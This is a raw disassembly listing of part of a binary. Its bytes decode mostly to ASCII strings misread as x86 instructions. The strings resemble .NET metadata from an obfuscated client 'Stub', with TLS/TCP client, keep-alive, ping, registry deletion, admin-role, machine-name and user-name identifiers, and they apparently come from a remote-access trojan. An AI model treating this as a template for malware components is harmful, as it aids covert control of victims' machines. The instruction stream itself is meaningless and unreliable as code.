  407f18:	00 6d 74             	add    %ch,0x74(%ebp)
  407f1b:	44                   	inc    %esp
  407f1c:	56                   	push   %esi
  407f1d:	4b                   	dec    %ebx
  407f1e:	53                   	push   %ebx
  407f1f:	79 46                	jns    0x407f67
  407f21:	59                   	pop    %ecx
  407f22:	70 4d                	jo     0x407f71
  407f24:	6f                   	outsl  %ds:(%esi),(%dx)
  407f25:	51                   	push   %ecx
  407f26:	4d                   	dec    %ebp
  407f27:	52                   	push   %edx
  407f28:	62 00                	bound  %eax,(%eax)
  407f2a:	77 50                	ja     0x407f7c
  407f2c:	70 6a                	jo     0x407f98
  407f2e:	45                   	inc    %ebp
  407f2f:	53                   	push   %ebx
  407f30:	78 6b                	js     0x407f9d
  407f32:	6d                   	insl   (%dx),%es:(%edi)
  407f33:	76 67                	jbe    0x407f9c
  407f35:	66 50                	push   %ax
  407f37:	63 62 00             	arpl   %esp,0x0(%edx)
  407f3a:	6d                   	insl   (%dx),%es:(%edi)
  407f3b:	73 63                	jae    0x407fa0
  407f3d:	6f                   	outsl  %ds:(%esi),(%dx)
  407f3e:	72 6c                	jb     0x407fac
  407f40:	69 62 00 53 74 75 62 	imul   $0x62757453,0x0(%edx),%esp
  407f47:	00 6f 6b             	add    %ch,0x6b(%edi)
  407f4a:	58                   	pop    %eax
  407f4b:	6c                   	insb   (%dx),%es:(%edi)
  407f4c:	4e                   	dec    %esi
  407f4d:	59                   	pop    %ecx
  407f4e:	4a                   	dec    %edx
  407f4f:	63 49 43             	arpl   %ecx,0x43(%ecx)
  407f52:	45                   	inc    %ebp
  407f53:	63 00                	arpl   %eax,(%eax)
  407f55:	53                   	push   %ebx
  407f56:	79 73                	jns    0x407fcb
  407f58:	74 65                	je     0x407fbf
  407f5a:	6d                   	insl   (%dx),%es:(%edi)
  407f5b:	2e 43                	cs inc %ebx
  407f5d:	6f                   	outsl  %ds:(%esi),(%dx)
  407f5e:	6c                   	insb   (%dx),%es:(%edi)
  407f5f:	6c                   	insb   (%dx),%es:(%edi)
  407f60:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407f65:	6e                   	outsb  %ds:(%esi),(%dx)
  407f66:	73 2e                	jae    0x407f96
  407f68:	47                   	inc    %edi
  407f69:	65 6e                	outsb  %gs:(%esi),(%dx)
  407f6b:	65 72 69             	gs jb  0x407fd7
  407f6e:	63 00                	arpl   %eax,(%eax)
  407f70:	4d                   	dec    %ebp
  407f71:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407f78:	74 2e                	je     0x407fa8
  407f7a:	56                   	push   %esi
  407f7b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407f82:	73 69                	jae    0x407fed
  407f84:	63 00                	arpl   %eax,(%eax)
  407f86:	6e                   	outsb  %ds:(%esi),(%dx)
  407f87:	4c                   	dec    %esp
  407f88:	6d                   	insl   (%dx),%es:(%edi)
  407f89:	6f                   	outsl  %ds:(%esi),(%dx)
  407f8a:	47                   	inc    %edi
  407f8b:	46                   	inc    %esi
  407f8c:	52                   	push   %edx
  407f8d:	46                   	inc    %esi
  407f8e:	67 6b 63 00 67       	imul   $0x67,0x0(%bp,%di),%esp
  407f93:	65 74 5f             	gs je  0x407ff5
  407f96:	53                   	push   %ebx
  407f97:	65 6e                	outsb  %gs:(%esi),(%dx)
  407f99:	64 53                	fs push %ebx
  407f9b:	79 6e                	jns    0x40800b
  407f9d:	63 00                	arpl   %eax,(%eax)
  407f9f:	46                   	inc    %esi
  407fa0:	54                   	push   %esp
  407fa1:	54                   	push   %esp
  407fa2:	70 52                	jo     0x407ff6
  407fa4:	45                   	inc    %ebp
  407fa5:	4e                   	dec    %esi
  407fa6:	41                   	inc    %ecx
  407fa7:	78 78                	js     0x408021
  407fa9:	71 73                	jno    0x40801e
  407fab:	63 00                	arpl   %eax,(%eax)
  407fad:	67 65 74 5f          	addr16 gs je 0x408010
  407fb1:	49                   	dec    %ecx
  407fb2:	64 00 72 57          	add    %dh,%fs:0x57(%edx)
  407fb6:	6e                   	outsb  %ds:(%esi),(%dx)
  407fb7:	76 45                	jbe    0x407ffe
  407fb9:	75 57                	jne    0x408012
  407fbb:	62 78 70             	bound  %edi,0x70(%eax)
  407fbe:	4f                   	dec    %edi
  407fbf:	78 4d                	js     0x40800e
  407fc1:	6c                   	insb   (%dx),%es:(%edi)
  407fc2:	49                   	dec    %ecx
  407fc3:	64 00 55 52          	add    %dl,%fs:0x52(%ebp)
  407fc7:	73 52                	jae    0x40801b
  407fc9:	4e                   	dec    %esi
  407fca:	59                   	pop    %ecx
  407fcb:	6e                   	outsb  %ds:(%esi),(%dx)
  407fcc:	49                   	dec    %ecx
  407fcd:	4b                   	dec    %ebx
  407fce:	64 00 51 76          	add    %dl,%fs:0x76(%ecx)
  407fd2:	4a                   	dec    %edx
  407fd3:	51                   	push   %ecx
  407fd4:	4f                   	dec    %edi
  407fd5:	7a 6a                	jp     0x408041
  407fd7:	62 58 58             	bound  %ebx,0x58(%eax)
  407fda:	78 6f                	js     0x40804b
  407fdc:	79 56                	jns    0x408034
  407fde:	51                   	push   %ecx
  407fdf:	64 00 59 4f          	add    %bl,%fs:0x4f(%ecx)
  407fe3:	43                   	inc    %ebx
  407fe4:	75 59                	jne    0x40803f
  407fe6:	53                   	push   %ebx
  407fe7:	66 6b 53 59 56       	imul   $0x56,0x59(%ebx),%dx
  407fec:	59                   	pop    %ecx
  407fed:	64 00 64 62 73       	add    %ah,%fs:0x73(%edx,%eiz,2)
  407ff2:	52                   	push   %edx
  407ff3:	59                   	pop    %ecx
  407ff4:	70 6d                	jo     0x408063
  407ff6:	70 71                	jo     0x408069
  407ff8:	48                   	dec    %eax
  407ff9:	61                   	popa
  407ffa:	4a                   	dec    %edx
  407ffb:	57                   	push   %edi
  407ffc:	59                   	pop    %ecx
  407ffd:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  408001:	64 52                	fs push %edx
  408003:	65 61                	gs popa
  408005:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  408009:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  408010:	00 
  408011:	54                   	push   %esp
  408012:	68 72 65 61 64       	push   $0x64616572
  408017:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  40801b:	64 00 72 4e          	add    %dh,%fs:0x4e(%edx)
  40801f:	42                   	inc    %edx
  408020:	4e                   	dec    %esi
  408021:	58                   	pop    %eax
  408022:	79 66                	jns    0x40808a
  408024:	4e                   	dec    %esi
  408025:	76 6c                	jbe    0x408093
  408027:	41                   	inc    %ecx
  408028:	57                   	push   %edi
  408029:	6a 76                	push   $0x76
  40802b:	62 64 00 41          	bound  %esp,0x41(%eax,%eax,1)
  40802f:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  408034:	41                   	inc    %ecx
  408035:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  40803b:	61                   	popa
  40803c:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  408042:	74 5f                	je     0x4080a3
  408044:	43                   	inc    %ebx
  408045:	6f                   	outsl  %ds:(%esi),(%dx)
  408046:	6e                   	outsb  %ds:(%esi),(%dx)
  408047:	6e                   	outsb  %ds:(%esi),(%dx)
  408048:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40804d:	00 67 65             	add    %ah,0x65(%edi)
  408050:	74 5f                	je     0x4080b1
  408052:	49                   	dec    %ecx
  408053:	73 43                	jae    0x408098
  408055:	6f                   	outsl  %ds:(%esi),(%dx)
  408056:	6e                   	outsb  %ds:(%esi),(%dx)
  408057:	6e                   	outsb  %ds:(%esi),(%dx)
  408058:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40805d:	00 73 65             	add    %dh,0x65(%ebx)
  408060:	74 5f                	je     0x4080c1
  408062:	49                   	dec    %ecx
  408063:	73 43                	jae    0x4080a8
  408065:	6f                   	outsl  %ds:(%esi),(%dx)
  408066:	6e                   	outsb  %ds:(%esi),(%dx)
  408067:	6e                   	outsb  %ds:(%esi),(%dx)
  408068:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40806d:	00 67 65             	add    %ah,0x65(%edi)
  408070:	74 5f                	je     0x4080d1
  408072:	47                   	inc    %edi
  408073:	75 69                	jne    0x4080de
  408075:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  408079:	65 6e                	outsb  %gs:(%esi),(%dx)
  40807b:	64 53                	fs push %ebx
  40807d:	79 6e                	jns    0x4080ed
  40807f:	63 3e                	arpl   %edi,(%esi)
  408081:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408085:	61                   	popa
  408086:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408089:	6e                   	outsb  %ds:(%esi),(%dx)
  40808a:	67 46                	addr16 inc %esi
  40808c:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408093:	73 43                	jae    0x4080d8
  408095:	6f                   	outsl  %ds:(%esi),(%dx)
  408096:	6e                   	outsb  %ds:(%esi),(%dx)
  408097:	6e                   	outsb  %ds:(%esi),(%dx)
  408098:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40809d:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4080a2:	61                   	popa
  4080a3:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4080a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4080a7:	67 46                	addr16 inc %esi
  4080a9:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  4080b0:	65 65 70 41          	gs gs jo 0x4080f5
  4080b4:	6c                   	insb   (%dx),%es:(%edi)
  4080b5:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  4080bc:	42                   	inc    %edx
  4080bd:	61                   	popa
  4080be:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4080c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4080c2:	67 46                	addr16 inc %esi
  4080c4:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  4080cb:	65 61                	gs popa
  4080cd:	64 65 72 53          	fs gs jb 0x408124
  4080d1:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  4080d8:	42                   	inc    %edx
  4080d9:	61                   	popa
  4080da:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4080dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4080de:	67 46                	addr16 inc %esi
  4080e0:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  4080e7:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  4080ee:	42                   	inc    %edx
  4080ef:	61                   	popa
  4080f0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4080f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4080f4:	67 46                	addr16 inc %esi
  4080f6:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4080fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4080fe:	74 65                	je     0x408165
  408100:	72 76                	jb     0x408178
  408102:	61                   	popa
  408103:	6c                   	insb   (%dx),%es:(%edi)
  408104:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408109:	61                   	popa
  40810a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40810d:	6e                   	outsb  %ds:(%esi),(%dx)
  40810e:	67 46                	addr16 inc %esi
  408110:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  408117:	75 66                	jne    0x40817f
  408119:	66 65 72 3e          	data16 gs jb 0x40815b
  40811d:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408121:	61                   	popa
  408122:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408125:	6e                   	outsb  %ds:(%esi),(%dx)
  408126:	67 46                	addr16 inc %esi
  408128:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  40812f:	66 66 73 65          	data16 data16 jae 0x408198
  408133:	74 3e                	je     0x408173
  408135:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408139:	61                   	popa
  40813a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40813d:	6e                   	outsb  %ds:(%esi),(%dx)
  40813e:	67 46                	addr16 inc %esi
  408140:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  408147:	73 6c                	jae    0x4081b5
  408149:	43                   	inc    %ebx
  40814a:	6c                   	insb   (%dx),%es:(%edi)
  40814b:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408152:	5f                   	pop    %edi
  408153:	42                   	inc    %edx
  408154:	61                   	popa
  408155:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408158:	6e                   	outsb  %ds:(%esi),(%dx)
  408159:	67 46                	addr16 inc %esi
  40815b:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  408162:	63 70 43             	arpl   %esi,0x43(%eax)
  408165:	6c                   	insb   (%dx),%es:(%edi)
  408166:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  40816d:	5f                   	pop    %edi
  40816e:	42                   	inc    %edx
  40816f:	61                   	popa
  408170:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408173:	6e                   	outsb  %ds:(%esi),(%dx)
  408174:	67 46                	addr16 inc %esi
  408176:	69 65 6c 64 00 53 6c 	imul   $0x6c530064,0x6c(%ebp),%esp
  40817d:	52                   	push   %edx
  40817e:	6a 54                	push   $0x54
  408180:	65 69 62 78 73 74 63 	imul   $0x6e637473,%gs:0x78(%edx),%esp
  408187:	6e 
  408188:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  40818c:	70 65                	jo     0x4081f3
  40818e:	6e                   	outsb  %ds:(%esi),(%dx)
  40818f:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  408193:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  40819a:	61 
  40819b:	6c                   	insb   (%dx),%es:(%edi)
  40819c:	75 65                	jne    0x408203
  40819e:	4b                   	dec    %ebx
  40819f:	69 6e 64 00 66 41 6f 	imul   $0x6f416600,0x64(%esi),%ebp
  4081a6:	64 47                	fs inc %edi
  4081a8:	54                   	push   %esp
  4081a9:	4f                   	dec    %edi
  4081aa:	41                   	inc    %ecx
  4081ab:	75 4f                	jne    0x4081fc
  4081ad:	59                   	pop    %ecx
  4081ae:	73 64                	jae    0x408214
  4081b0:	00 67 45             	add    %ah,0x45(%edi)
  4081b3:	49                   	dec    %ecx
  4081b4:	50                   	push   %eax
  4081b5:	61                   	popa
  4081b6:	43                   	inc    %ebx
  4081b7:	48                   	dec    %eax
  4081b8:	65 4b                	gs dec %ebx
  4081ba:	77 64                	ja     0x408220
  4081bc:	00 61 45             	add    %ah,0x45(%ecx)
  4081bf:	71 43                	jno    0x408204
  4081c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c2:	76 76                	jbe    0x40823a
  4081c4:	41                   	inc    %ecx
  4081c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c6:	49                   	dec    %ecx
  4081c7:	6b 4e 79 64          	imul   $0x64,0x79(%esi),%ecx
  4081cb:	00 6e 56             	add    %ch,0x56(%esi)
  4081ce:	78 7a                	js     0x40824a
  4081d0:	4b                   	dec    %ebx
  4081d1:	43                   	inc    %ebx
  4081d2:	70 59                	jo     0x40822d
  4081d4:	56                   	push   %esi
  4081d5:	50                   	push   %eax
  4081d6:	5a                   	pop    %edx
  4081d7:	74 48                	je     0x408221
  4081d9:	65 00 67 48          	add    %ah,%gs:0x48(%edi)
  4081dd:	48                   	dec    %eax
  4081de:	44                   	inc    %esp
  4081df:	4f                   	dec    %edi
  4081e0:	63 73 7a             	arpl   %esi,0x7a(%ebx)
  4081e3:	52                   	push   %edx
  4081e4:	41                   	inc    %ecx
  4081e5:	57                   	push   %edi
  4081e6:	65 00 69 4e          	add    %ch,%gs:0x4e(%ecx)
  4081ea:	4e                   	dec    %esi
  4081eb:	4a                   	dec    %edx
  4081ec:	6d                   	insl   (%dx),%es:(%edi)
  4081ed:	6a 4b                	push   $0x4b
  4081ef:	49                   	dec    %ecx
  4081f0:	69 68 47 6d 58 65 00 	imul   $0x65586d,0x47(%eax),%ebp
  4081f7:	54                   	push   %esp
  4081f8:	43                   	inc    %ebx
  4081f9:	79 6e                	jns    0x408269
  4081fb:	62 48 54             	bound  %ecx,0x54(%eax)
  4081fe:	50                   	push   %eax
  4081ff:	76 57                	jbe    0x408258
  408201:	71 71                	jno    0x408274
  408203:	71 72                	jno    0x408277
  408205:	5a                   	pop    %edx
  408206:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40820a:	70 6c                	jo     0x408278
  40820c:	61                   	popa
  40820d:	63 65 00             	arpl   %esp,0x0(%ebp)
  408210:	43                   	inc    %ebx
  408211:	72 65                	jb     0x408278
  408213:	61                   	popa
  408214:	74 65                	je     0x40827b
  408216:	49                   	dec    %ecx
  408217:	6e                   	outsb  %ds:(%esi),(%dx)
  408218:	73 74                	jae    0x40828e
  40821a:	61                   	popa
  40821b:	6e                   	outsb  %ds:(%esi),(%dx)
  40821c:	63 65 00             	arpl   %esp,0x0(%ebp)
  40821f:	73 65                	jae    0x408286
  408221:	74 5f                	je     0x408282
  408223:	4d                   	dec    %ebp
  408224:	6f                   	outsl  %ds:(%esi),(%dx)
  408225:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  40822a:	6c                   	insb   (%dx),%es:(%edi)
  40822b:	65 4d                	gs dec %ebp
  40822d:	6f                   	outsl  %ds:(%esi),(%dx)
  40822e:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408233:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  40823a:	64 65 
  40823c:	00 45 6e             	add    %al,0x6e(%ebp)
  40823f:	74 65                	je     0x4082a6
  408241:	72 44                	jb     0x408287
  408243:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408247:	4d                   	dec    %ebp
  408248:	6f                   	outsl  %ds:(%esi),(%dx)
  408249:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  40824e:	79 70                	jns    0x4082c0
  408250:	74 6f                	je     0x4082c1
  408252:	53                   	push   %ebx
  408253:	74 72                	je     0x4082c7
  408255:	65 61                	gs popa
  408257:	6d                   	insl   (%dx),%es:(%edi)
  408258:	4d                   	dec    %ebp
  408259:	6f                   	outsl  %ds:(%esi),(%dx)
  40825a:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  40825f:	6d                   	insl   (%dx),%es:(%edi)
  408260:	70 72                	jo     0x4082d4
  408262:	65 73 73             	gs jae 0x4082d8
  408265:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  40826c:	00 43 69             	add    %al,0x69(%ebx)
  40826f:	70 68                	jo     0x4082d9
  408271:	65 72 4d             	gs jb  0x4082c1
  408274:	6f                   	outsl  %ds:(%esi),(%dx)
  408275:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  40827a:	6c                   	insb   (%dx),%es:(%edi)
  40827b:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  408280:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  408286:	65 74 65             	gs je  0x4082ee
  408289:	53                   	push   %ebx
  40828a:	75 62                	jne    0x4082ee
  40828c:	4b                   	dec    %ebx
  40828d:	65 79 54             	gs jns 0x4082e4
  408290:	72 65                	jb     0x4082f7
  408292:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408296:	74 5f                	je     0x4082f7
  408298:	4d                   	dec    %ebp
  408299:	65 73 73             	gs jae 0x40830f
  40829c:	61                   	popa
  40829d:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  4082a2:	76 6f                	jbe    0x408313
  4082a4:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  4082a8:	45                   	inc    %ebp
  4082a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4082aa:	75 6d                	jne    0x408319
  4082ac:	65 72 61             	gs jb  0x408310
  4082af:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4082b3:	49                   	dec    %ecx
  4082b4:	44                   	inc    %esp
  4082b5:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4082bc:	6c                   	insb   (%dx),%es:(%edi)
  4082bd:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  4082c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4082c3:	75 62                	jne    0x408327
  4082c5:	6c                   	insb   (%dx),%es:(%edi)
  4082c6:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4082ca:	74 5f                	je     0x40832b
  4082cc:	48                   	dec    %eax
  4082cd:	61                   	popa
  4082ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4082cf:	64 6c                	fs insb (%dx),%es:(%edi)
  4082d1:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4082d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4082d6:	74 69                	je     0x408341
  4082d8:	6d                   	insl   (%dx),%es:(%edi)
  4082d9:	65 46                	gs inc %esi
  4082db:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  4082e2:	64 6c                	fs insb (%dx),%es:(%edi)
  4082e4:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4082e8:	74 4d                	je     0x408337
  4082ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4082eb:	64 75 6c             	fs jne 0x40835a
  4082ee:	65 48                	gs dec %eax
  4082f0:	61                   	popa
  4082f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4082f2:	64 6c                	fs insb (%dx),%es:(%edi)
  4082f4:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4082f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4082f9:	74 69                	je     0x408364
  4082fb:	6d                   	insl   (%dx),%es:(%edi)
  4082fc:	65 54                	gs push %esp
  4082fe:	79 70                	jns    0x408370
  408300:	65 48                	gs dec %eax
  408302:	61                   	popa
  408303:	6e                   	outsb  %ds:(%esi),(%dx)
  408304:	64 6c                	fs insb (%dx),%es:(%edi)
  408306:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40830a:	74 54                	je     0x408360
  40830c:	79 70                	jns    0x40837e
  40830e:	65 46                	gs inc %esi
  408310:	72 6f                	jb     0x408381
  408312:	6d                   	insl   (%dx),%es:(%edi)
  408313:	48                   	dec    %eax
  408314:	61                   	popa
  408315:	6e                   	outsb  %ds:(%esi),(%dx)
  408316:	64 6c                	fs insb (%dx),%es:(%edi)
  408318:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  40831c:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408323:	65 
  408324:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  408328:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  40832f:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  408336:	6e 
  408337:	52                   	push   %edx
  408338:	6f                   	outsl  %ds:(%esi),(%dx)
  408339:	6c                   	insb   (%dx),%es:(%edi)
  40833a:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  40833e:	6e                   	outsb  %ds:(%esi),(%dx)
  40833f:	64 6f                	outsl  %fs:(%esi),(%dx)
  408341:	77 73                	ja     0x4083b6
  408343:	42                   	inc    %edx
  408344:	75 69                	jne    0x4083af
  408346:	6c                   	insb   (%dx),%es:(%edi)
  408347:	74 49                	je     0x408392
  408349:	6e                   	outsb  %ds:(%esi),(%dx)
  40834a:	52                   	push   %edx
  40834b:	6f                   	outsl  %ds:(%esi),(%dx)
  40834c:	6c                   	insb   (%dx),%es:(%edi)
  40834d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408351:	74 5f                	je     0x4083b2
  408353:	4d                   	dec    %ebp
  408354:	61                   	popa
  408355:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  40835c:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408360:	6f                   	outsl  %ds:(%esi),(%dx)
  408361:	63 65 73             	arpl   %esp,0x73(%ebp)
  408364:	73 4d                	jae    0x4083b3
  408366:	6f                   	outsl  %ds:(%esi),(%dx)
  408367:	64 75 6c             	fs jne 0x4083d6
  40836a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40836e:	74 5f                	je     0x4083cf
  408370:	57                   	push   %edi
  408371:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408378:	79 6c                	jns    0x4083e6
  40837a:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40837e:	6f                   	outsl  %ds:(%esi),(%dx)
  40837f:	63 65 73             	arpl   %esp,0x73(%ebp)
  408382:	73 57                	jae    0x4083db
  408384:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40838b:	79 6c                	jns    0x4083f9
  40838d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408391:	74 5f                	je     0x4083f2
  408393:	46                   	inc    %esi
  408394:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40839b:	00 
  40839c:	73 65                	jae    0x408403
  40839e:	74 5f                	je     0x4083ff
  4083a0:	46                   	inc    %esi
  4083a1:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083a8:	00 
  4083a9:	47                   	inc    %edi
  4083aa:	65 74 54             	gs je  0x408401
  4083ad:	65 6d                	gs insl (%dx),%es:(%edi)
  4083af:	70 46                	jo     0x4083f7
  4083b1:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083b8:	00 
  4083b9:	47                   	inc    %edi
  4083ba:	65 74 46             	gs je  0x408403
  4083bd:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083c4:	00 
  4083c5:	67 65 74 5f          	addr16 gs je 0x408428
  4083c9:	4d                   	dec    %ebp
  4083ca:	61                   	popa
  4083cb:	63 68 69             	arpl   %ebp,0x69(%eax)
  4083ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4083cf:	65 4e                	gs dec %esi
  4083d1:	61                   	popa
  4083d2:	6d                   	insl   (%dx),%es:(%edi)
  4083d3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4083d7:	74 5f                	je     0x408438
  4083d9:	4f                   	dec    %edi
  4083da:	53                   	push   %ebx
  4083db:	46                   	inc    %esi
  4083dc:	75 6c                	jne    0x40844a
  4083de:	6c                   	insb   (%dx),%es:(%edi)
  4083df:	4e                   	dec    %esi
  4083e0:	61                   	popa
  4083e1:	6d                   	insl   (%dx),%es:(%edi)
  4083e2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4083e6:	74 5f                	je     0x408447
  4083e8:	46                   	inc    %esi
  4083e9:	75 6c                	jne    0x408457
  4083eb:	6c                   	insb   (%dx),%es:(%edi)
  4083ec:	4e                   	dec    %esi
  4083ed:	61                   	popa
  4083ee:	6d                   	insl   (%dx),%es:(%edi)
  4083ef:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4083f3:	74 5f                	je     0x408454
  4083f5:	55                   	push   %ebp
  4083f6:	73 65                	jae    0x40845d
  4083f8:	72 4e                	jb     0x408448
  4083fa:	61                   	popa
  4083fb:	6d                   	insl   (%dx),%es:(%edi)
  4083fc:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408400:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  408404:	6f                   	outsl  %ds:(%esi),(%dx)
  408405:	73 74                	jae    0x40847b
  408407:	4e                   	dec    %esi
  408408:	61                   	popa
  408409:	6d                   	insl   (%dx),%es:(%edi)
  40840a:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  40840f:	65 54                	gs push %esp
  408411:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  408418:	5f                   	pop    %edi
  408419:	4c                   	dec    %esp
  40841a:	61                   	popa
  40841b:	73 74                	jae    0x408491
  40841d:	57                   	push   %edi
  40841e:	72 69                	jb     0x408489
  408420:	74 65                	je     0x408487
  408422:	54                   	push   %esp
  408423:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  40842a:	6e                   	outsb  %ds:(%esi),(%dx)
  40842b:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408432:	54                   	push   %esp
  408433:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  40843a:	74 65                	je     0x4084a1
  40843c:	4c                   	dec    %esp
  40843d:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408444:	62 69 6e             	bound  %ebp,0x6e(%ecx)
